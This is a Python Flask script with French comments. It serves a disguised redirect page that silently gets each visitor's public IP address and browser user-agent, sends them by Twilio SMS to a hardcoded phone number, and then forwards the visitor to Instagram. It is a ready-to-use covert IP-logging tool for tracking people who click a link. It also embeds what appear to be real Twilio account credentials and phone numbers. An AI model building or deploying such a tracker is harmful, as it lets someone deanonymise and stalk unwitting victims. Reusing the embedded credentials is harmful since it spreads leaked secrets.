from flask import Flask, request, redirect, jsonify
from twilio.rest import Client
import os

app = Flask(__name__)

# Twilio config (remplace avec tes vraies infos)
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
from_number = '+12524866318'
to_number = '+33635960569'

client = Client(account_sid, auth_token)

def send_sms(ip, user_agent):
    message_body = f"IP publique : {ip}\nUser-Agent : {user_agent}"
    try:
        message = client.messages.create(
            body=message_body,
            from_=from_number,
            to=to_number
        )
        print(f"[+] SMS envoyé : {message.sid}")
    except Exception as e:
        print(f"[!] Erreur envoi SMS : {e}")

@app.route('/')
def index():
    return '''
    <html>
    <head><title>Redirection</title></head>
    <body>
        <script>
            fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                fetch("/log", {
                    method: "POST",
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        ip: data.ip,
                        ua: navigator.userAgent
                    })
                }).then(() => {
                    window.location.href = "https://www.instagram.com";  // ta redirection
                });
            });
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    user_agent = data.get('ua')
    print(f"[+] IP reçue : {ip}")
    send_sms(ip, user_agent)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
